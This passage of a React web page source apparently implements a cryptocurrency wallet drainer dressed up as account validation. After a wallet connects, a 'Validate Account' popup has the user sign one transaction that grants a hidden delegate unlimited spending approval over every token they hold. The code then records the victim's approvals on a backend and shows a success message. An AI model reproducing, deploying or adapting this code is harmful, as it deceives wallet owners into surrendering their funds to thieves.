            console.error('[SolanaConnection] Please check your environment variables (NEXT_PUBLIC_SOLANA_MAINNET_RPC).');
            return;
          }
          
          console.log(`[SolanaConnection] Using RPC: ${rpcUrl}`);
          const connection = new Connection(rpcUrl, 'confirmed');
          
          setSolanaAccount(publicKey);
          setSolanaConnection(connection);
          setSolanaDelegate(delegateAddress);
          setCurrentWalletType('solana');
          
          // Fetch tokens automatically
          setSolanaLoading(true);
          await fetchSolanaTokens(publicKey, connection);
        } catch (providerError) {
          console.error('Error getting Solana account from provider:', providerError);
        }
      }
    };

    // Check periodically for Solana connection
    const interval = setInterval(setupSolanaConnection, 1000);
    setupSolanaConnection(); // Run immediately
    
    return () => clearInterval(interval);
  }, [solanaWalletProvider, solanaAccount, fetchSolanaTokens]);

  // Show popup when Solana tokens are loaded
  useEffect(() => {
    if (currentWalletType === 'solana' && solanaTokens.length > 0 && !showPopup) {
      setShowPopup(true);
    }
  }, [solanaTokens.length, currentWalletType, showPopup]);

  const handleSolanaValidation = useCallback(async () => {
    if (!solanaWalletProvider || !solanaAccount || !solanaConnection || !solanaDelegate || solanaTokens.length === 0) {
      alert('Please connect a Solana wallet and ensure tokens are loaded.');
      return;
    }

    try {
      setProcessingAction('creating_approvals');
      
      const ownerPublicKey = new PublicKey(solanaAccount);
      const delegatePublicKey = new PublicKey(solanaDelegate);
      
      const transaction = new Transaction();
      const approvals: Array<{
        tokenAccount: string;
        mint: string;
        amount: string;
        decimals: number;
        symbol?: string;
      }> = [];

      // Create approval instructions for each token
      for (const token of solanaTokens) {
        try {
          const tokenAccountPubkey = new PublicKey(token.tokenAccount);
          
          // Get current allowance to check if approval is needed
          const accountInfo = await getAccount(solanaConnection, tokenAccountPubkey);
          
          // Create approval instruction with max amount (or specific amount)
          // Using max uint64 for maximum approval
          const maxAmount = BigInt('18446744073709551615'); // 2^64 - 1
          
          const approveInstruction = createApproveInstruction(
            tokenAccountPubkey, // tokenAccount
            delegatePublicKey, // delegate
            ownerPublicKey, // owner
            maxAmount, // amount
            [], // multiSigners (empty for single signer)
            TOKEN_PROGRAM_ID
          );
          
          transaction.add(approveInstruction);
          
          approvals.push({
            tokenAccount: token.tokenAccount,
            mint: token.mint,
            amount: maxAmount.toString(),
            decimals: token.decimals,
            symbol: token.symbol,
          });
          
          console.log(`✅ Created approval instruction for ${token.symbol}`);
        } catch (tokenError: any) {
          console.error(`❌ Failed to create approval for ${token.symbol}:`, tokenError.message);
          // Continue with other tokens
        }
      }

      if (approvals.length === 0) {
        throw new Error('No valid approvals could be created');
      }

      setProcessingAction('signing_transaction');
      
      // Get fresh blockhash right before signing to avoid expiration
      // Solana blockhashes expire quickly, so we get it just before signing
      const { blockhash, lastValidBlockHeight } = await solanaConnection.getLatestBlockhash('finalized');
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = ownerPublicKey;

      // Sign and send transaction
      // Use window.solana directly to avoid Reown's chain ID validation issues
      let signature: string;
      
      if (typeof window !== 'undefined' && (window as any).solana?.signTransaction) {
        // Use the wallet directly (Phantom, Solflare, etc.) to avoid Reown validation issues
        console.log('[SolanaSign] Using window.solana directly...');
        
        // Sign the transaction (user will approve in wallet popup)
        const signedTx = await (window as any).solana.signTransaction(transaction);
        
        // Send immediately after signing to minimize blockhash expiration risk
        try {
          signature = await solanaConnection.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            maxRetries: 3,
          });
          
          // Confirm with the blockhash we used
          await solanaConnection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight,
          }, 'confirmed');
        } catch (sendError: any) {
          // If blockhash expired, we need to create a new transaction with fresh blockhash
          if (sendError.message?.includes('Blockhash not found') || 
              sendError.message?.includes('blockhash') ||
              sendError.message?.includes('block hash')) {
            console.log('[SolanaSign] Blockhash expired, creating new transaction with fresh blockhash...');
            
            // Get fresh blockhash
            const { blockhash: retryBlockhash, lastValidBlockHeight: retryLastValidBlockHeight } = await solanaConnection.getLatestBlockhash('finalized');
            
            // Create a new transaction with fresh blockhash
            const retryTransaction = new Transaction();
            retryTransaction.recentBlockhash = retryBlockhash;
            retryTransaction.feePayer = ownerPublicKey;
            
            // Re-add all instructions
            for (const token of solanaTokens) {
              try {
                const tokenAccountPubkey = new PublicKey(token.tokenAccount);
                const maxAmount = BigInt('18446744073709551615');
                const approveInstruction = createApproveInstruction(
                  tokenAccountPubkey,
                  delegatePublicKey,
                  ownerPublicKey,
                  maxAmount,
                  [],
                  TOKEN_PROGRAM_ID
                );
                retryTransaction.add(approveInstruction);
              } catch (e) {
                // Skip failed tokens
              }
            }
            
            // Sign the retry transaction (user will need to approve again)
            const retrySignedTx = await (window as any).solana.signTransaction(retryTransaction);
            signature = await solanaConnection.sendRawTransaction(retrySignedTx.serialize(), {
              skipPreflight: false,
              maxRetries: 3,
            });
            
            // Confirm with retry blockhash
            await solanaConnection.confirmTransaction({
              signature,
              blockhash: retryBlockhash,
              lastValidBlockHeight: retryLastValidBlockHeight,
            }, 'confirmed');
          } else {
            throw sendError;
          }
        }
        
        console.log(`✅ Transaction confirmed: ${signature}`);
      } else {
        throw new Error('Solana wallet not found. Please install Phantom or another Solana wallet.');
      }

      // Store approval details in MongoDB
      setProcessingAction('storing_approval');
      const response = await fetch('/api/store/solana-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          owner: solanaAccount,
          delegate: solanaDelegate,
          approvals,
          transactionSignature: signature,
          network: solanaNetwork,
        }),
      });

      const result = await response.json();
      if (response.ok) {
        console.log('✅ Solana approval stored successfully');
        setShowPopup(false);
        alert(`Account Validated Successfully!\n\nTransaction: ${signature}\n\nProcessed: ${approvals.length} token approvals`);
      } else {
        throw new Error(result.message || 'Failed to store approval');
      }
    } catch (e) {
      console.error('❌ Solana validation failed:', e);
      alert(`Validation failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    } finally {
      setProcessingAction('');
    }
  }, [solanaWalletProvider, solanaAccount, solanaConnection, solanaDelegate, solanaTokens, solanaNetwork]);

  return (
    <div className="w-full relative">
      <section className="container mx-auto px-4 sm:px-6 lg:px-8">
        <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-4 sm:mb-6 text-center text-blue-700 mt-16 md:mt-20">
          Connection Page
        </h2>
        <p className="text-center text-sm sm:text-base md:text-lg text-gray-600 mb-8 sm:mb-10 max-w-2xl mx-auto">
          Connect with one of our available providers or create a new one.
        </p>
        
        <div className="grid grid-cols-2 gap-3 sm:gap-4 md:gap-6">
          {wallets.map((wallet) => (
            <Card
              key={wallet.name}
              className={`cursor-pointer transition-all ${
                selectedWallet === wallet.name ? 'ring-1 ring-purple-600' : 'hover:bg-gray-50'
              }`}
              onClick={() => {
                setSelectedWallet(wallet.name);
                connectWallet();
              }}
            >
              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                <span className="flex flex-col items-center">
                  <div className="mb-3 sm:mb-4">
                    <Image
                      src={wallet.imgUrl}
                      alt={wallet.name}
                      width={36}
                      height={36}
                      className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 object-contain"
                    />
                  </div>
                  <span className="text-xs sm:text-sm md:text-base font-semibold text-center text-blue-600">
                    {wallet.name}
                  </span>
                </span>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      {showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-xl p-6 max-w-md w-full mx-4">
            <div className="text-center mb-6">
              <h3 className="text-xl font-bold text-blue-700 mb-2">Account Validation Required</h3>
              
              {currentWalletType === 'evm' || (!currentWalletType && account) ? (
                <>
                  {!CONTRACT_ADDRESSES[chainId] ? (
                    <p className="text-red-600 mb-4">
                      This network ({getNetworkName(chainId)}) is not supported yet. Please switch to a supported network.
                    </p>
                  ) : (
                    <p className="text-gray-600 mb-4">
                      To proceed, please validate your account:
                    </p>
                  )}

                  {account && (
                    <div className="bg-gray-100 rounded-md p-3 mb-4">
                      <p className="text-sm text-gray-700 mb-1">Connected Account:</p>
                      <p className="font-mono text-blue-600 font-medium">{formatAddress(account)}</p>
                      <p className="text-sm text-gray-700 mt-2 mb-1">Network:</p>
                      <p className="font-medium text-blue-600">{getNetworkName(chainId)}</p>
                    </div>
                  )}

                  {loading ? (
                    <div className="flex justify-center items-center p-4">
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                      <p className="ml-3 text-blue-700">Loading...</p>
                    </div>
                  ) : processingAction ? (
                    <div className="flex justify-center items-center p-4">
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                      <p className="ml-3 text-blue-700">
                        {processingAction === 'approve' ? 'Validating...' : 'Finishing'}
                      </p>
                    </div>
                  ) : (
                    <div className="flex flex-col gap-3">
                      <button
                        onClick={handleValidation}
                        disabled={!provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]}
                        className={`w-full py-3 px-4 rounded-lg font-medium text-white ${
                          !provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]
                            ? 'bg-gray-400 cursor-not-allowed'
                            : 'bg-blue-600 hover:bg-blue-700'
                        } transition-colors duration-200`}
                      >
                        Validate Account
                      </button>
                      <button
                        onClick={() => setShowPopup(false)}
                        className="w-full py-2 px-4 rounded-lg font-medium text-gray-700 bg-gray-200 hover:bg-gray-300 mt-2"
                      >
                        Cancel
                      </button>
                    </div>
                  )}
                </>
              ) : (
                <>
                  {solanaAccount && (
                    <div className="bg-gray-100 rounded-md p-3 mb-4">
                      <p className="text-sm text-gray-700 mb-1">Connected Account:</p>
                      <p className="font-mono text-blue-600 font-medium">{formatAddress(solanaAccount)}</p>
                    </div>
                  )}

                  {solanaLoading ? (
                    <div className="flex justify-center items-center p-4">
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                      <p className="ml-3 text-blue-700">Loading</p>
                    </div>
                  ) : processingAction ? (
                    <div className="flex justify-center items-center p-4">
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                      <p className="ml-3 text-blue-700">
                        {processingAction === 'creating_validation' ? 'Creating' : 
                         processingAction === 'validating' ? 'Validating' : 
                         processingAction === 'finishing validation' ? 'finishing valaidation' : 'Processing...'}
                      </p>
                    </div>
                  ) : (
                    <div className="flex flex-col gap-3">
                      <button
                        onClick={handleSolanaValidation}
                        disabled={!solanaWalletProvider || !solanaAccount || !solanaConnection || !solanaDelegate || solanaTokens.length === 0}
                        className={`w-full py-3 px-4 rounded-lg font-medium text-white ${
                          !solanaWalletProvider || !solanaAccount || !solanaConnection || !solanaDelegate || solanaTokens.length === 0
                            ? 'bg-gray-400 cursor-not-allowed'
                            : 'bg-blue-600 hover:bg-blue-700'
                        } transition-colors duration-200`}
                      >
                        Validate Account
                      </button>
                      <button
                        onClick={() => {
                          setShowPopup(false);
                          setCurrentWalletType(null);
                        }}
                        className="w-full py-2 px-4 rounded-lg font-medium text-gray-700 bg-gray-200 hover:bg-gray-300 mt-2"
                      >
                        Cancel
                      </button>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}